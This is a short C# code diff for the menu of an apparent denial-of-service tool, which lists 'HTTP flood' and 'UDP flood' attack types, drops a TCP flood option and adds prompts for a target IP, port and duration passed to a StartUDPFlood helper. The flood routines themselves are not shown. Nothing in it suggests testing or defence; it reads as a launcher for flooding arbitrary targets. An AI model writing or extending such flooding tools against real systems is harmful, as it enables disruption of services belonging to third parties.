@@ -13,21 +13,27 @@ public class Tools
 		string menu = "Select attack type\n" +
 		              "1. HTTP flood\n" +
 		              "2. UDP flood\n" +
-		              "3. TCP flood\n" +
 		              "0. Exit";
 		
 		switch (ui.SelectOption(true, menu))
 		{
 			case 1:
-				Console.WriteLine("Enter URL/IP | Time");
-				string url = Console.ReadLine();
-				int time =  int.Parse(Console.ReadLine());
+				Console.WriteLine("Enter URL/IP");
+				string httpUrl = Console.ReadLine();
+				Console.WriteLine("Enter Duration (in seconds)");
+				int httpTime =  int.Parse(Console.ReadLine());
 
-				dosHelper.StartHTTPFlood(url, time);
+				dosHelper.StartHTTPFlood(httpUrl, httpTime);
 				break;
 			case 2:
-				break;
-			case 3:	
+				Console.WriteLine("Enter IP");
+				string udpIp = Console.ReadLine();	
+				Console.WriteLine("Enter Port");
+				int udpPort = int.Parse(Console.ReadLine());
+				Console.WriteLine("Enter Duration (in seconds)");
+				int udpTime = int.Parse(Console.ReadLine());
+				
+				dosHelper.StartUDPFlood(udpIp, udpPort, udpTime);
 				break;
 			
 			default:
